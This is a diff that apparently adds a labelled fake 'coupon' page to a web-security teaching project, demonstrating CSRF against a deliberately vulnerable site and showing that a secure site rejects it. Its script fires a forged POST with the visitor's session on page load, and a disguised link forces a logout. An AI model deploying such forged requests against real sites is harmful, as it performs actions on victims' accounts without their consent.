@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>ShopDeals &mdash; 80% Off Everything!</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body class="theme-home theme-evil">
+    <div class="evil-banner">
+        <strong>This is not a real coupon site.</strong> It is a stand-in for a page an attacker would host on their
+        own domain, used here to show what Cross-Site Request Forgery (CSRF) looks like from the visitor's side. See
+        <a id="csrf-writeup-link" href="/vulnerabilities.php#csrf">the CSRF write-up</a> for how it works and why it is
+        served from this project instead of a second domain.
+    </div>
+
+    <main class="evil-wrap">
+        <section class="evil-hero">
+            <h1>&#127881; 80% Off Everything!</h1>
+            <p>Today only. One click to claim your discount code.</p>
+            <a class="evil-btn" href="/vulnerable/logout.php">Claim My Coupon</a>
+        </section>
+
+        <section class="evil-section">
+            <h2>What that button actually does</h2>
+            <p>It is a plain link to <code>/vulnerable/logout.php</code>. If you were signed in to the vulnerable
+                site in this browser, clicking it just logged you out with no confirmation, then landed you here or on
+                the login page. Nothing about this page could tell your browser was signed in anywhere; it only needed
+                you to click a link that pointed at someone else's site.</p>
+            <p><a href="/vulnerable/index.php">&larr; Sign back in to the vulnerable site</a> and click the button again
+                to see it a second time.</p>
+        </section>
+
+        <section class="evil-section">
+            <h2>What loaded the moment this page opened</h2>
+            <p>A script on this page also sent a request to the vulnerable site's "save post" endpoint the instant you
+                arrived, using whatever vulnerable-site session cookie your browser already had. No click needed.</p>
+            <div id="vuln-status" class="evil-status">Running&hellip;</div>
+        </section>
+
+        <section class="evil-section">
+            <h2>Now try the same two tricks on the secure site</h2>
+            <p>Sign in to the secure site in another tab first, then come back and use these.</p>
+            <p><a href="/safe/logout.php">Try the same "logout" link</a> against the secure site.</p>
+            <div id="safe-logout-note" class="evil-status">This is a GET request. The secure site only accepts logout as
+                a POST with a matching token, so this link alone does nothing harmful: open it, then check whether
+                you're still signed in.</div>
+            <p>
+                <button type="button" id="safe-forge-btn">Send the same forged "save post" request to the secure site
+                </button>
+            </p>
+            <div id="safe-status" class="evil-status">Not sent yet.</div>
+        </section>
+    </main>
+
+    <script>
+        async function forge(url, label, el) {
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    credentials: 'same-origin',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ post_id: 1 })
+                });
+                const text = await res.text();
+                if (res.ok) {
+                    el.textContent = label + ' succeeded (HTTP ' + res.status + '):\n' + text +
+                        '\n\nThe request went through using your existing session, with nothing from you but visiting this page.';
+                    el.className = 'evil-status ok';
+                } else {
+                    el.textContent = label + ' was rejected (HTTP ' + res.status + '):\n' + text;
+                    el.className = 'evil-status blocked';
+                }
+            } catch (e) {
+                el.textContent = label + ' could not be sent: ' + e;
+                el.className = 'evil-status blocked';
+            }
+        }
+
+        forge('/vulnerable/posts/logic/process-save-post.php?action=insert', 'Forged request to the vulnerable site',
+            document.getElementById('vuln-status'));
+
+        document.getElementById('safe-forge-btn').addEventListener('click', function () {
+            forge('/safe/posts/logic/process-save-post.php?action=insert', 'Forged request to the secure site',
+                document.getElementById('safe-status'));
+        });
+    </script>
+</body>
+
+</html>
